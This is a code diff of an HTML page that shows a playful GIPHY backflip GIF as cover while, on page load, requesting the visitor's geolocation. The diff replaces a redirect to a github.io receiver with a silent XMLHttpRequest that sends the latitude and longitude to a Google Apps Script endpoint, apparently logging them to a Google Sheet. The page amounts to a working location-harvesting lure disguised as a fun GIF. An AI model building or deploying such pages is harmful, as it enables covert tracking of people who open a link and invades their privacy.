@@ -2,14 +2,18 @@
 <html>
 <body onload="getLocation()">
 
+<!-- Your GIF (for fun) -->
 <iframe src="https://giphy.com/embed/YTJXDiVNMPuNSMgC0" width="442" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
 <p><a href="https://giphy.com/gifs/moodman-fail-life-backflip-YTJXDiVNMPuNSMgC0">via GIPHY</a></p>
 
+<!-- Placeholder for the location display -->
 <p id="demo"></p>
 
 <script>
+// This is the placeholder element to show location status
 var x = document.getElementById("demo");
 
+// Function to get the location
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition);
@@ -18,11 +22,24 @@ function getLocation() {
     }
 }
 
+// This function will be triggered when location is successfully obtained
 function showPosition(position) {
-    // Redirect to your endpoint with the latitude and longitude as query parameters
     const lat = position.coords.latitude;
     const long = position.coords.longitude;
-    window.location.href = "https://chandu2005d.github.io/addyourwishes/receive.html?lat=" + lat + "&long=" + long;
+    
+    // Set up the URL for your Google Apps Script
+    const googleScriptURL = "https://script.google.com/macros/s/AKfycbySAP6KAAlhS8Z-Rtj30nb06Tk9fpQWUClWc09o0E97k-thh5FX5WRgEn2ArycpNYHjnQ/exec";
+    
+    // Construct the full URL to send the latitude and longitude
+    const url = googleScriptURL + "?lat=" + lat + "&long=" + long;
+
+    // Send the data to Google Sheets using an HTTP GET request
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", url, true);
+    xhttp.send();
+    
+    // Optionally, display confirmation on the page
+    x.innerHTML = "Location data sent successfully!";
 }
 </script>
 
